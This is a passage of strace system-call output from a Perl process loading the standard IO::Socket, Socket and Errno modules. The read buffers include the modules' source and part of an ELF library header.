${*$fh}{\'io_pipe_pid\'});\n\n    $r;\n}\n\n1;\n\n__END__\n\n", 4096) = 3426
12518 20:27:41.892064 _llseek(6, 3425, [3425], SEEK_SET) = 0
12518 20:27:41.892083 _llseek(6, 0, [3425], SEEK_CUR) = 0
12518 20:27:41.892093 close(6)          = 0
12518 20:27:41.892148 stat64("/etc/perl/IO/Socket.pmc", 0xbfa2b77c) = -1 ENOENT (No such file or directory)
12518 20:27:41.892181 stat64("/etc/perl/IO/Socket.pm", 0xbfa2b68c) = -1 ENOENT (No such file or directory)
12518 20:27:41.892196 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pmc", 0xbfa2b77c) = -1 ENOENT (No such file or directory)
12518 20:27:41.892209 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pm", 0xbfa2b68c) = -1 ENOENT (No such file or directory)
12518 20:27:41.892229 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pmc", 0xbfa2b77c) = -1 ENOENT (No such file or directory)
12518 20:27:41.892256 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pm", 0xbfa2b68c) = -1 ENOENT (No such file or directory)
12518 20:27:41.892271 stat64("/usr/lib/perl5/IO/Socket.pmc", 0xbfa2b77c) = -1 ENOENT (No such file or directory)
12518 20:27:41.892283 stat64("/usr/lib/perl5/IO/Socket.pm", 0xbfa2b68c) = -1 ENOENT (No such file or directory)
12518 20:27:41.892296 stat64("/usr/share/perl5/IO/Socket.pmc", 0xbfa2b77c) = -1 ENOENT (No such file or directory)
12518 20:27:41.892308 stat64("/usr/share/perl5/IO/Socket.pm", 0xbfa2b68c) = -1 ENOENT (No such file or directory)
12518 20:27:41.892322 stat64("/usr/lib/perl/5.8/IO/Socket.pmc", 0xbfa2b77c) = -1 ENOENT (No such file or directory)
12518 20:27:41.892335 stat64("/usr/lib/perl/5.8/IO/Socket.pm", {st_mode=S_IFREG|0644, st_size=6699, ...}) = 0
12518 20:27:41.892357 open("/usr/lib/perl/5.8/IO/Socket.pm", O_RDONLY|O_LARGEFILE) = 6
12518 20:27:41.892372 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa2b498) = -1 ENOTTY (Inappropriate ioctl for device)
12518 20:27:41.892384 _llseek(6, 0, [0], SEEK_CUR) = 0
12518 20:27:41.892402 read(6, "# IO::Socket.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket;\n\nrequire 5.006;\n\nuse IO::Handle;\nuse Socket 1.3;\nuse Carp;\nuse strict;\nour(@ISA, $VERSION, @EXPORT_OK);\nuse Exporter;\nuse Errno;\n\n# legacy\n\nrequire IO::Socket::INET;\nrequire IO::Socket::UNIX if ($^O ne \'epoc\' && $^O ne \'symbian\');\n\n@ISA = qw(IO::Handle);\n\n$VERSION = \"1.29\";\n\n@EXPORT_OK = qw(sockatmark);\n\nsub import {\n    my $pkg = shift;\n    if (@_ && $_[0] eq \'sockatmark\') { # not very extensible but for now, fast\n\tExporter::export_to_level(\'IO::Socket\', 1, $pkg, \'sockatmark\');\n    } else {\n\tmy $callpkg = caller;\n\tExporter::export \'Socket\', $callpkg, @_;\n    }\n}\n\nsub new {\n    my($class,%arg) = @_;\n    my $sock = $class->SUPER::new();\n\n    $sock->autoflush(1);\n\n    ${*$sock}{\'io_socket_timeout\'} = delete $arg{Timeout};\n\n    return scalar(%arg) ? $sock->configure(\\%arg)\n\t\t\t: $sock;\n}\n\nmy @domain2pkg;\n\nsub register_domain {\n    my($p,$d) = @_;\n    $domain2pkg[$d] = $p;\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my $domain = delete $arg->{Domain};\n\n    croak \'IO::Socket: Cannot configure a generic socket\'\n\tunless defined $domain;\n\n    croak \"IO::Socket: Unsupported socket domain\"\n\tunless defined $domain2pkg[$domain];\n\n    croak \"IO::Socket: Cannot configure socket in domain \'$domain\'\"\n\tunless ref($sock) eq \"IO::Socket\";\n\n    bless($sock, $domain2pkg[$domain]);\n    $sock->configure($arg);\n}\n\nsub socket {\n    @_ == 4 or croak \'usage: $sock->socket(DOMAIN, TYPE, PROTOCOL)\';\n    my($sock,$domain,$type,$protocol) = @_;\n\n    socket($sock,$domain,$type,$protocol) or\n    \treturn undef;\n\n    ${*$sock}{\'io_socket_domain\'} = $domain;\n    ${*$sock}{\'io_socket_type\'}   = $type;\n    ${*$sock}{\'io_socket_proto\'}  = $protocol;\n\n    $sock;\n}\n\nsub socketpair {\n    @_ == 4 || croak \'usage: IO::Socket->socketpair(DOMAIN, TYPE, PROTOCOL)\';\n    my($class,$domain,$type,$protocol) = @_;\n    my $sock1 = $class->new();\n    my $sock2 = $class->new();\n\n    socketpair($sock1,$sock2,$domain,$type,$protocol) or\n    \treturn ();\n\n    ${*$sock1}{\'io_socket_type\'}  = ${*$sock2}{\'io_socket_type\'}  = $type;\n    ${*$sock1}{\'io_socket_proto\'} = ${*$sock2}{\'io_socket_proto\'} = $protocol;\n\n    ($sock1,$sock2);\n}\n\nsub connect {\n    @_ == 2 or croak \'usage: $sock->connect(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $err;\n    my $blocking;\n\n    $blocking = $sock->blocking(0) if $timeout;\n    if (!connect($sock, $addr)) {\n\tif (defined $timeout && $!{EINPROGRESS}) {\n\t    require IO::Select;\n\n\t    my $sel = new IO::Select $sock;\n\n\t    if (!$sel->can_write($timeout)) {\n\t\t$err = $! || (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);\n\t\t$@ = \"connect: timeout\";\n\t    }\n\t    elsif (!connect($sock,$addr) && not $!{EISCONN}) {\n\t\t# Some systems refuse to re-connect() to\n\t\t# an already open socket and set errno to EISCONN.\n\t\t$err = $!;\n\t\t$@ = \"connect: $!\";\n\t    }\n\t}\n        elsif ($blocking || !$!{EINPROGRESS})  {\n\t    $err = $!;\n\t    $@ = \"connect: $!\";\n\t}\n    }\n\n    $sock->blocking(1) if $blocking;\n\n    $! = $err if $err;\n\n    $err ? undef : $sock;\n}\n\nsub bind {\n    @_ == 2 or croak \'usage: $sock->bind(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n\n    return bind($sock, $addr) ? $sock\n\t\t\t      : undef;\n}\n\nsub listen {\n    @_ >= 1 && @_ <= 2 or croak \'usage: $sock->listen([QUEUE])\';\n    my($sock,$queue) = @_;\n    $queue = 5\n\tunless $queue && $queue > 0;\n\n    return listen($sock, $queue) ? $sock\n\t\t\t\t : undef;\n}\n\nsub accept {\n    @_ == 1 || @_ == 2 or croak \'usage $sock->accept([PKG])\';\n    my $sock = shift;\n    my $pkg = shift || $sock;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $new = $pkg->new(Timeout => $timeout);\n    my $peer = undef;\n\n    if(defined $timeout) {\n\trequire IO::Select;\n\n\tmy $sel = new IO::Select $sock;\n\n\tunless ($sel->can_read($timeout)) {\n\t    $@ = \'accept: timeout\';\n\t    $! = (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);\n\t    return;\n\t}\n", 4096) = 4096
12518 20:27:41.892734 stat64("/etc/perl/Socket.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.892750 stat64("/etc/perl/Socket.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.892764 stat64("/usr/local/lib/perl/5.8.8/Socket.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.892777 stat64("/usr/local/lib/perl/5.8.8/Socket.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.892791 stat64("/usr/local/share/perl/5.8.8/Socket.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.892804 stat64("/usr/local/share/perl/5.8.8/Socket.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.892818 stat64("/usr/lib/perl5/Socket.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.892831 stat64("/usr/lib/perl5/Socket.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.892844 stat64("/usr/share/perl5/Socket.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.892856 stat64("/usr/share/perl5/Socket.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.892870 stat64("/usr/lib/perl/5.8/Socket.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.892882 stat64("/usr/lib/perl/5.8/Socket.pm", {st_mode=S_IFREG|0644, st_size=3514, ...}) = 0
12518 20:27:41.892904 open("/usr/lib/perl/5.8/Socket.pm", O_RDONLY|O_LARGEFILE) = 8
12518 20:27:41.892918 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa2afe8) = -1 ENOTTY (Inappropriate ioctl for device)
12518 20:27:41.892929 _llseek(8, 0, [0], SEEK_CUR) = 0
12518 20:27:41.892947 read(8, "package Socket;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS);\n$VERSION = \"1.78\";\n\nuse Carp;\nuse warnings::register;\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n@EXPORT = qw(\n\tinet_aton inet_ntoa\n\tsockaddr_family\n\tpack_sockaddr_in unpack_sockaddr_in\n\tpack_sockaddr_un unpack_sockaddr_un\n\tsockaddr_in sockaddr_un\n\tINADDR_ANY INADDR_BROADCAST INADDR_LOOPBACK INADDR_NONE\n\tAF_802\n\tAF_AAL\n\tAF_APPLETALK\n\tAF_CCITT\n\tAF_CHAOS\n\tAF_CTF\n\tAF_DATAKIT\n\tAF_DECnet\n\tAF_DLI\n\tAF_ECMA\n\tAF_GOSIP\n\tAF_HYLINK\n\tAF_IMPLINK\n\tAF_INET\n\tAF_INET6\n\tAF_ISO\n\tAF_KEY\n\tAF_LAST\n\tAF_LAT\n\tAF_LINK\n\tAF_MAX\n\tAF_NBS\n\tAF_NIT\n\tAF_NS\n\tAF_OSI\n\tAF_OSINET\n\tAF_PUP\n\tAF_ROUTE\n\tAF_SNA\n\tAF_UNIX\n\tAF_UNSPEC\n\tAF_USER\n\tAF_WAN\n\tAF_X25\n\tIOV_MAX\n\tMSG_BCAST\n\tMSG_BTAG\n\tMSG_CTLFLAGS\n\tMSG_CTLIGNORE\n\tMSG_CTRUNC\n\tMSG_DONTROUTE\n\tMSG_DONTWAIT\n\tMSG_EOF\n\tMSG_EOR\n\tMSG_ERRQUEUE\n\tMSG_ETAG\n\tMSG_FIN\n\tMSG_MAXIOVLEN\n\tMSG_MCAST\n\tMSG_NOSIGNAL\n\tMSG_OOB\n\tMSG_PEEK\n\tMSG_PROXY\n\tMSG_RST\n\tMSG_SYN\n\tMSG_TRUNC\n\tMSG_URG\n\tMSG_WAITALL\n\tMSG_WIRE\n\tPF_802\n\tPF_AAL\n\tPF_APPLETALK\n\tPF_CCITT\n\tPF_CHAOS\n\tPF_CTF\n\tPF_DATAKIT\n\tPF_DECnet\n\tPF_DLI\n\tPF_ECMA\n\tPF_GOSIP\n\tPF_HYLINK\n\tPF_IMPLINK\n\tPF_INET\n\tPF_INET6\n\tPF_ISO\n\tPF_KEY\n\tPF_LAST\n\tPF_LAT\n\tPF_LINK\n\tPF_MAX\n\tPF_NBS\n\tPF_NIT\n\tPF_NS\n\tPF_OSI\n\tPF_OSINET\n\tPF_PUP\n\tPF_ROUTE\n\tPF_SNA\n\tPF_UNIX\n\tPF_UNSPEC\n\tPF_USER\n\tPF_WAN\n\tPF_X25\n\tSCM_CONNECT\n\tSCM_CREDENTIALS\n\tSCM_CREDS\n\tSCM_RIGHTS\n\tSCM_TIMESTAMP\n\tSHUT_RD\n\tSHUT_RDWR\n\tSHUT_WR\n\tSOCK_DGRAM\n\tSOCK_RAW\n\tSOCK_RDM\n\tSOCK_SEQPACKET\n\tSOCK_STREAM\n\tSOL_SOCKET\n\tSOMAXCONN\n\tSO_ACCEPTCONN\n\tSO_ATTACH_FILTER\n\tSO_BACKLOG\n\tSO_BROADCAST\n\tSO_CHAMELEON\n\tSO_DEBUG\n\tSO_DETACH_FILTER\n\tSO_DGRAM_ERRIND\n\tSO_DONTLINGER\n\tSO_DONTROUTE\n\tSO_ERROR\n\tSO_FAMILY\n\tSO_KEEPALIVE\n\tSO_LINGER\n\tSO_OOBINLINE\n\tSO_PASSCRED\n\tSO_PASSIFNAME\n\tSO_PEERCRED\n\tSO_PROTOCOL\n\tSO_PROTOTYPE\n\tSO_RCVBUF\n\tSO_RCVLOWAT\n\tSO_RCVTIMEO\n\tSO_REUSEADDR\n\tSO_REUSEPORT\n\tSO_SECURITY_AUTHENTICATION\n\tSO_SECURITY_ENCRYPTION_NETWORK\n\tSO_SECURITY_ENCRYPTION_TRANSPORT\n\tSO_SNDBUF\n\tSO_SNDLOWAT\n\tSO_SNDTIMEO\n\tSO_STATE\n\tSO_TYPE\n\tSO_USELOOPBACK\n\tSO_XOPEN\n\tSO_XSE\n\tUIO_MAXIOV\n);\n\n@EXPORT_OK = qw(CR LF CRLF $CR $LF $CRLF\n\n\t       IPPROTO_TCP\n\t       TCP_KEEPALIVE\n\t       TCP_MAXRT\n\t       TCP_MAXSEG\n\t       TCP_NODELAY\n\t       TCP_STDURG);\n\n%EXPORT_TAGS = (\n    crlf    => [qw(CR LF CRLF $CR $LF $CRLF)],\n    all     => [@EXPORT, @EXPORT_OK],\n);\n\nBEGIN {\n    sub CR   () {\"\\015\"}\n    sub LF   () {\"\\012\"}\n    sub CRLF () {\"\\015\\012\"}\n}\n\n*CR   = \\CR();\n*LF   = \\LF();\n*CRLF = \\CRLF();\n\nsub sockaddr_in {\n    if (@_ == 6 && !wantarray) { # perl5.001m compat; use this && die\n\tmy($af, $port, @quad) = @_;\n\twarnings::warn \"6-ARG sockaddr_in call is deprecated\" \n\t    if warnings::enabled();\n\tpack_sockaddr_in($port, inet_aton(join(\'.\', @quad)));\n    } elsif (wantarray) {\n\tcroak \"usage:   (port,iaddr) = sockaddr_in(sin_sv)\" unless @_ == 1;\n        unpack_sockaddr_in(@_);\n    } else {\n\tcroak \"usage:   sin_sv = sockaddr_in(port,iaddr))\" unless @_ == 2;\n        pack_sockaddr_in(@_);\n    }\n}\n\nsub sockaddr_un {\n    if (wantarray) {\n\tcroak \"usage:   (filename) = sockaddr_un(sun_sv)\" unless @_ == 1;\n        unpack_sockaddr_un(@_);\n    } else {\n\tcroak \"usage:   sun_sv = sockaddr_un(filename)\" unless @_ == 1;\n        pack_sockaddr_un(@_);\n    }\n}\n\nsub AUTOLOAD {\n    my($constname);\n    ($constname = $AUTOLOAD) =~ s/.*:://;\n    croak \"&Socket::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n\tcroak $error;\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Socket\', $VERSION;\n\n1;\n", 4096) = 3514
12518 20:27:41.893100 brk(0x8239000)    = 0x8239000
12518 20:27:41.893243 read(8, "", 4096) = 0
12518 20:27:41.893259 close(8)          = 0
12518 20:27:41.893348 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.so", {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
12518 20:27:41.893374 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
12518 20:27:41.893403 open("/usr/lib/perl/5.8/auto/Socket/Socket.so", O_RDONLY) = 8
12518 20:27:41.893418 read(8, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\360\16\0\0004\0\0\0\34I\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\264F\0\0\264F\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264F\0\0\264V\0\0\264V\0\0\274\1\0\0\300\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\310F\0\0\310V\0\0\310V\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0%\0\0\0008\0\0\0\0\0\0\0\10\0\0\0\22\0\0\0\35\0\0\0\0\0\0\0)\0\0\0\0\0\0\0\0\0\0\0\7\0\0\0\37\0\0\0\0\0\0\0\0\0\0\0007\0\0\0$\0\0\0-\0\0\0(\0\0\0\36\0\0\0\n\0\0\0,\0\0\0001\0\0\0 \0\0\0\0\0\0\0000\0\0\0\0\0\0\0005\0\0\0!\0\0\0\0\0\0\0\30\0\0\0002\0\0\0\27\0\0\0\'\0\0\0+\0\0\0\f\0\0\0\0\0\0\0.\0\0\0/\0\0\0&\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0*\0\0\0\0\0\0\0\t\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4\0\0\0\17\0\0\0\0\0\0\0\6\0\0\0\20\0\0\0\0\0\0\0\21\0\0\0\24\0\0\0\26\0\0\0\0\0\0\0\23\0\0\0\0\0\0\0\25\0\0\0\0\0\0\0\0\0\0\0\r\0\0\0\0\0\0\0\31\0\0\0003\0\0\0\0\0\0\0\34\0\0\0\0\0\0\0\0\0\0\0%\0\0\0#\0\0\0\5\0\0\0004\0\0\0\0\0\0\0\33\0\0\0", 512) = 512
12518 20:27:41.893514 fstat64(8, {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
12518 20:27:41.893533 mmap2(NULL, 22644, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 8, 0) = 0xb7dab000
12518 20:27:41.893547 mmap2(0xb7db0000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 8, 0x4) = 0xb7db0000
12518 20:27:41.893563 close(8)          = 0
12518 20:27:41.894195 brk(0x825a000)    = 0x825a000
12518 20:27:41.894356 stat64("/etc/perl/Errno.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.894375 stat64("/etc/perl/Errno.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.894389 stat64("/usr/local/lib/perl/5.8.8/Errno.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.894402 stat64("/usr/local/lib/perl/5.8.8/Errno.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.894417 stat64("/usr/local/share/perl/5.8.8/Errno.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.894430 stat64("/usr/local/share/perl/5.8.8/Errno.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.894444 stat64("/usr/lib/perl5/Errno.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.894457 stat64("/usr/lib/perl5/Errno.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.894470 stat64("/usr/share/perl5/Errno.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.894482 stat64("/usr/share/perl5/Errno.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.894496 stat64("/usr/lib/perl/5.8/Errno.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.894509 stat64("/usr/lib/perl/5.8/Errno.pm", {st_mode=S_IFREG|0644, st_size=5967, ...}) = 0
12518 20:27:41.894530 open("/usr/lib/perl/5.8/Errno.pm", O_RDONLY|O_LARGEFILE) = 8
12518 20:27:41.894545 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa2afe8) = -1 ENOTTY (Inappropriate ioctl for device)
12518 20:27:41.894557 _llseek(8, 0, [0], SEEK_CUR) = 0
12518 20:27:41.894577 read(8, "#\n# This file is auto-generated. ***ANY*** changes here will be lost\n#\n\npackage Errno;\nour (@EXPORT_OK,%EXPORT_TAGS,@ISA,$VERSION,%errno,$AUTOLOAD);\nuse Exporter ();\nuse strict;\n\n$VERSION = \"1.09_01\";\n$VERSION = eval $VERSION;\n@ISA = qw(Exporter);\n\n@EXPORT_OK = qw(EBADR ENOMSG ENOTSUP ESTRPIPE EADDRINUSE EL3HLT EBADF\n\tENOTBLK ENAVAIL ECHRNG ENOTNAM ELNRNG ENOKEY EXDEV EBADE EBADSLT\n\tECONNREFUSED ENOSTR ENONET EOVERFLOW EISCONN EFBIG EKEYREVOKED\n\tECONNRESET EWOULDBLOCK ELIBMAX EREMOTEIO ENOPKG ELIBSCN EDESTADDRREQ\n\tENOTSOCK EIO EMEDIUMTYPE EINPROGRESS ERANGE EAFNOSUPPORT EADDRNOTAVAIL\n\tEINTR EREMOTE EILSEQ ENOMEM EPIPE ENETUNREACH ENODATA EUSERS\n\tEOPNOTSUPP EPROTO EISNAM ESPIPE EALREADY ENAMETOOLONG ENOEXEC EISDIR\n\tEBADRQC EEXIST EDOTDOT ELIBBAD EOWNERDEAD ESRCH EFAULT EXFULL\n\tEDEADLOCK EAGAIN ENOPROTOOPT ENETDOWN EPROTOTYPE EL2NSYNC ENETRESET\n\tEUCLEAN EADV EROFS ESHUTDOWN EMULTIHOP EPROTONOSUPPORT ENFILE ENOLCK\n\tECONNABORTED ECANCELED EDEADLK ESRMNT ENOLINK ETIME ENOTDIR EINVAL\n\tENOTTY ENOANO ELOOP ENOENT EPFNOSUPPORT EBADMSG ENOMEDIUM EL2HLT EDOM\n\tEBFONT EKEYEXPIRED EMSGSIZE ENOCSI EL3RST ENOSPC EIDRM ENOBUFS ENOSYS\n\tEHOSTDOWN EBADFD ENOSR ENOTCONN ESTALE EDQUOT EKEYREJECTED EMFILE\n\tENOTRECOVERABLE EACCES EBUSY E2BIG EPERM ELIBEXEC ETOOMANYREFS ELIBACC\n\tENOTUNIQ ECOMM ERESTART ESOCKTNOSUPPORT EUNATCH ETIMEDOUT ENXIO ENODEV\n\tETXTBSY EMLINK ECHILD EHOSTUNREACH EREMCHG ENOTEMPTY);\n\t\n%EXPORT_TAGS = (\n    POSIX => [qw(\n\tE2BIG EACCES EADDRINUSE EADDRNOTAVAIL EAFNOSUPPORT EAGAIN EALREADY\n\tEBADF EBUSY ECHILD ECONNABORTED ECONNREFUSED ECONNRESET EDEADLK\n\tEDESTADDRREQ EDOM EDQUOT EEXIST EFAULT EFBIG EHOSTDOWN EHOSTUNREACH\n\tEINPROGRESS EINTR EINVAL EIO EISCONN EISDIR ELOOP EMFILE EMLINK\n\tEMSGSIZE ENAMETOOLONG ENETDOWN ENETRESET ENETUNREACH ENFILE ENOBUFS\n\tENODEV ENOENT ENOEXEC ENOLCK ENOMEM ENOPROTOOPT ENOSPC ENOSYS ENOTBLK\n\tENOTCONN ENOTDIR ENOTEMPTY ENOTSOCK ENOTTY ENXIO EOPNOTSUPP EPERM\n\tEPFNOSUPPORT EPIPE EPROTONOSUPPORT EPROTOTYPE ERANGE EREMOTE ERESTART\n\tEROFS ESHUTDOWN ESOCKTNOSUPPORT ESPIPE ESRCH ESTALE ETIMEDOUT\n\tETOOMANYREFS ETXTBSY EUSERS EWOULDBLOCK EXDEV\n    )]\n);\n\nsub EPERM () { 1 }\nsub ENOENT () { 2 }\nsub ESRCH () { 3 }\nsub EINTR () { 4 }\nsub EIO () { 5 }\nsub ENXIO () { 6 }\nsub E2BIG () { 7 }\nsub ENOEXEC () { 8 }\nsub EBADF () { 9 }\nsub ECHILD () { 10 }\nsub EWOULDBLOCK () { 11 }\nsub EAGAIN () { 11 }\nsub ENOMEM () { 12 }\nsub EACCES () { 13 }\nsub EFAULT () { 14 }\nsub ENOTBLK () { 15 }\nsub EBUSY () { 16 }\nsub EEXIST () { 17 }\nsub EXDEV () { 18 }\nsub ENODEV () { 19 }\nsub ENOTDIR () { 20 }\nsub EISDIR () { 21 }\nsub EINVAL () { 22 }\nsub ENFILE () { 23 }\nsub EMFILE () { 24 }\nsub ENOTTY () { 25 }\nsub ETXTBSY () { 26 }\nsub EFBIG () { 27 }\nsub ENOSPC () { 28 }\nsub ESPIPE () { 29 }\nsub EROFS () { 30 }\nsub EMLINK () { 31 }\nsub EPIPE () { 32 }\nsub EDOM () { 33 }\nsub ERANGE () { 34 }\nsub EDEADLOCK () { 35 }\nsub EDEADLK () { 35 }\nsub ENAMETOOLONG () { 36 }\nsub ENOLCK () { 37 }\nsub ENOSYS () { 38 }\nsub ENOTEMPTY () { 39 }\nsub ELOOP () { 40 }\nsub ENOMSG () { 42 }\nsub EIDRM () { 43 }\nsub ECHRNG () { 44 }\nsub EL2NSYNC () { 45 }\nsub EL3HLT () { 46 }\nsub EL3RST () { 47 }\nsub ELNRNG () { 48 }\nsub EUNATCH () { 49 }\nsub ENOCSI () { 50 }\nsub EL2HLT () { 51 }\nsub EBADE () { 52 }\nsub EBADR () { 53 }\nsub EXFULL () { 54 }\nsub ENOANO () { 55 }\nsub EBADRQC () { 56 }\nsub EBADSLT () { 57 }\nsub EBFONT () { 59 }\nsub ENOSTR () { 60 }\nsub ENODATA () { 61 }\nsub ETIME () { 62 }\nsub ENOSR () { 63 }\nsub ENONET () { 64 }\nsub ENOPKG () { 65 }\nsub EREMOTE () { 66 }\nsub ENOLINK () { 67 }\nsub EADV () { 68 }\nsub ESRMNT () { 69 }\nsub ECOMM () { 70 }\nsub EPROTO () { 71 }\nsub EMULTIHOP () { 72 }\nsub EDOTDOT () { 73 }\nsub EBADMSG () { 74 }\nsub EOVERFLOW () { 75 }\nsub ENOTUNIQ () { 76 }\nsub EBADFD () { 77 }\nsub EREMCHG () { 78 }\nsub ELIBACC () { 79 }\nsub ELIBBAD () { 80 }\nsub ELIBSCN () { 81 }\nsub ELIBMAX () { 82 }\nsub ELIBEXEC () { 83 }\nsub EILSEQ () { 84 }\nsub ERESTART () { 85 }\nsub ESTRPIPE () { 86 }\nsub EUSERS () { 87 }\nsub ENOTSOCK () { 88 }\nsub EDESTADDRREQ () { 89 }\nsub EMSGSIZE () { 90 }\nsub EPROTOTYPE () { 91 }\nsub ENOPROTOOPT () { 92 }\nsub EPROTONOSUPPORT () ", 4096) = 4096
12518 20:27:41.895307 read(8,  <unfinished ...>
12516 20:27:41.895328 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
12516 20:27:41.895351 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
12516 20:27:41.895367 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
12516 20:27:41.895378 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
12516 20:27:41.895391 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
12516 20:27:41.895405 waitpid(-1,  <unfinished ...>
12518 20:27:41.917233 <... read resumed> "{ 93 }\nsub ESOCKTNOSUPPORT () { 94 }\nsub ENOTSUP () { 95 }\nsub EOPNOTSUPP () { 95 }\nsub EPFNOSUPPORT () { 96 }\nsub EAFNOSUPPORT () { 97 }\nsub EADDRINUSE () { 98 }\nsub EADDRNOTAVAIL () { 99 }\nsub ENETDOWN () { 100 }\nsub ENETUNREACH () { 101 }\nsub ENETRESET () { 102 }\nsub ECONNABORTED () { 103 }\nsub ECONNRESET () { 104 }\nsub ENOBUFS () { 105 }\nsub EISCONN () { 106 }\nsub ENOTCONN () { 107 }\nsub ESHUTDOWN () { 108 }\nsub ETOOMANYREFS () { 109 }\nsub ETIMEDOUT () { 110 }\nsub ECONNREFUSED () { 111 }\nsub EHOSTDOWN () { 112 }\nsub EHOSTUNREACH () { 113 }\nsub EALREADY () { 114 }\nsub EINPROGRESS () { 115 }\nsub ESTALE () { 116 }\nsub EUCLEAN () { 117 }\nsub ENOTNAM () { 118 }\nsub ENAVAIL () { 119 }\nsub EISNAM () { 120 }\nsub EREMOTEIO () { 121 }\nsub EDQUOT () { 122 }\nsub ENOMEDIUM () { 123 }\nsub EMEDIUMTYPE () { 124 }\nsub ECANCELED () { 125 }\nsub ENOKEY () { 126 }\nsub EKEYEXPIRED () { 127 }\nsub EKEYREVOKED () { 128 }\nsub EKEYREJECTED () { 129 }\nsub EOWNERDEAD () { 130 }\nsub ENOTRECOVERABLE () { 131 }\n\nsub TIEHASH { bless [] }\n\nsub FETCH {\n    my ($self, $errname) = @_;\n    my $proto = prototype(\"Errno::$errname\");\n    my $errno = \"\";\n    if (defined($proto) && $proto eq \"\") {\n\tno strict \'refs\';\n\t$errno = &$errname;\n        $errno = 0 unless $! == $errno;\n    }\n    return $errno;\n}\n\nsub STORE {\n    require Carp;\n    Carp::confess(\"ERRNO hash is read only!\");\n}\n\n*CLEAR = \\&STORE;\n*DELETE = \\&STORE;\n\nsub NEXTKEY {\n    my($k,$v);\n    while(($k,$v) = each %Errno::) {\n\tmy $proto = prototype(\"Errno::$k\");\n\tlast if (defined($proto) && $proto eq \"\");\n    }\n    $k\n}\n\nsub FIRSTKEY {\n    my $s = scalar keys %Errno::;\t# initialize iterator\n    goto &NEXTKEY;\n}\n\nsub EXISTS {\n    my ($self, $errname) = @_;\n    my $r = ref $errname;\n    my $proto = !$r || $r eq \'CODE\' ? prototype($errname) : undef;\n    defined($proto) && $proto eq \"\";\n}\n\ntie %!, __PACKAGE__;\n\n1;\n__END__\n\n", 4096) = 1871
